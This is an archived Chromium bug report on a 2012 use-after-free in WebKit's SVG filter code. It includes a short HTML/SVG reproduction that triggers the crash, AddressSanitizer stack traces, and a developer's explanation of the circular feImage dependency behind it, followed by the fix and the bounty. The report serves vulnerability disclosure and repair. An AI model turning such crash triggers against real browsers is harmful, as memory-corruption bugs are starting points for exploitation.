# Heap-use-after-free in WebCore::GraphicsContext::restore

| Field | Value |
|-------|-------|
| **Issue ID** | [40064185](https://issues.chromium.org/issues/40064185) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-08-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::GraphicsContext::restore

**VERSION**  

Chrome Version: stable, beta, dev  

Operating System: linux 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<style>
</style>
<script>
onload = function() {
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElementNS('http://www.w3.org/2000/svg', 'filter')
el1.setAttribute('id','el1')
el0.appendChild(el1)
el2=document.createElementNS('http://www.w3.org/2000/svg', 'feImage')
el1.appendChild(el2)
document.body.offsetTop
el0.setAttribute('filter', 'url(#el1)')
el2.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==12607== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffebb720ec at pc 0x55555a508f2e bp 0x7ffffffeefc0 sp 0x7ffffffeefb8  

READ of size 1 at 0x7fffebb720ec thread T0  

#0 0x55555a508f2d in WebCore::GraphicsContext::restore() ???:0  

#1 0x55555c30d44c in WebCore::RenderSVGRoot::paintReplaced(WebCore::PaintInfo&, WebCore::FractionalLayoutPoint const&) ???:0  

#2 0x55555b7edc70 in WebCore::RenderReplaced::paint(WebCore::PaintInfo&, WebCore::FractionalLayoutPoint const&) ???:0

0x7fffebb720ec is located 108 bytes inside of 144-byte region [0x7fffebb72080,0x7fffebb72110)  

freed by thread T0 here:  

#0 0x55555f152d10 in \_\_interceptor\_free ??:0  

#1 0x55555a57a0a5 in WebCore::ImageBuffer::~ImageBuffer() ???:0  

#2 0x55555a63aa51 in WebCore::FilterEffect::~FilterEffect() ???:0  

#3 0x55555c5c266d in WebCore::FEImage::~FEImage() ???:0

## Attachments

- [108144-2.html](attachments/108144-2.html) (text/html; charset=us-ascii, 702 B)
- [stable-108144-2.txt](attachments/stable-108144-2.txt) (text/x-c; charset=us-ascii, 17.3 KB)
- [beta-108144-2.txt](attachments/beta-108144-2.txt) (text/x-c; charset=us-ascii, 17.3 KB)
- [108144-2.txt](attachments/108144-2.txt) (text/x-c; charset=us-ascii, 18.7 KB)

## Timeline

### in...@chromium.org (2012-08-20)

CF report coming - https://cluster-fuzz.appspot.com/testcase?key=96828636

### in...@chromium.org (2012-08-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=96828636

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f5ebc6932ec
Crash State:
  - crash stack -
  WebCore::GraphicsContext::restore
  WebCore::RenderSVGRoot::paintReplaced
  - free stack -
  WebCore::ImageBuffer::~ImageBuffer
  WebCore::FilterEffect::~FilterEffect
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=125849:125919

Minimized Testcase (0.60 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94TyPA2MSYvf6Wb1Q7pSqFDS0fDObWdbPr7_2rup52CbKZoC0maCGAvsO25W0Go5mSwqSoW77g6AcKQsPhQ1yrwYG7en5l_WG8ypyfERx1gsO5XhYvpDTZuGAsNSzQarIJqNytZE1wiKgtva2dxtnkGmp0EFt4N_6_XSg1fd_Bmlv6ioWY
<script>
      onload = function() {
        el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        el0.setAttribute('id','el0')
        document.body.appendChild(el0)
        el1=document.createElementNS('http://www.w3.org/2000/svg', 'filter')
        el1.setAttribute('id','el1')
        el0.appendChild(el1)
        el2=document.createElementNS('http://www.w3.org/2000/svg', 'feImage')
        el1.appendChild(el2)
        document.body.offsetTop
        el0.setAttribute('filter', 'url(#el1)')
        el2.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')
      }
    </script>

### in...@chromium.org (2012-08-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-20)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-08-20)

I'll take it.

### pa...@chromium.org (2012-08-22)

Upstreamed: https://bugs.webkit.org/show_bug.cgi?id=94652

### se...@chromium.org (2012-08-22)

Could you cc: me on the upstream bug?  I'm curious about the problem.

### sc...@chromium.org (2012-08-22)

It's dead simple, although maybe not too simple to fix.

An SVG doc and filter and feImage filter effect are created, but the feImage has no src. Then layout is forced, which has the effect of creating filter data. In the final step, the src of the feImage is set to the root SVG, creating a circular dependency which causes the filter code to free the graphics context it is using while still using it.

### se...@chromium.org (2012-08-22)

It sounds like we either need to extend the cycle detection currently done by FilterEffect to traverse into SVG documents (which might be tricky if the documents were pending external resource loads), or just prohibit SVG documents as FEImage sources altogether (big hammer).

### pa...@chromium.org (2012-10-05)

Friendly ping. This bug is reaching a ripe old age. :)

### sc...@chromium.org (2012-10-05)

I've spent a bunch of time wrapping my head around it. The problem is that the data needed is not in the places it's needed, so some rather significant refactoring is going to be required. It's the next bug on my agenda.

### in...@chromium.org (2012-10-14)

Mass move from m21 to m22.

### in...@chromium.org (2012-10-16)

http://trac.webkit.org/changeset/131488

### cl...@chromium.org (2012-10-17)

ClusterFuzz has detected this issue as fixed in range 162270:162321.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=96828636

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f5ebc6932ec
Crash State:
  - crash stack -
  WebCore::GraphicsContext::restore
  WebCore::RenderSVGRoot::paintReplaced
  - free stack -
  WebCore::ImageBuffer::~ImageBuffer
  WebCore::FilterEffect::~FilterEffect
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=125849:125919
Fixed: https://cluster-fuzz.appspot.com/revisions?range=162270:162321

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94TyPA2MSYvf6Wb1Q7pSqFDS0fDObWdbPr7_2rup52CbKZoC0maCGAvsO25W0Go5mSwqSoW77g6AcKQsPhQ1yrwYG7en5l_WG8ypyfERx1gsO5XhYvpDTZuGAsNSzQarIJqNytZE1wiKgtva2dxtnkGmp0EFt4N_6_XSg1fd_Bmlv6ioWY

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-10-29)

M23: http://trac.webkit.org/changeset/132809

We almost forgot reward-topanel :)

### sc...@gmail.com (2012-10-29)

... but we won't forget to reward at the $1000 level!

### sc...@gmail.com (2012-12-14)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/143761?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40064185)*
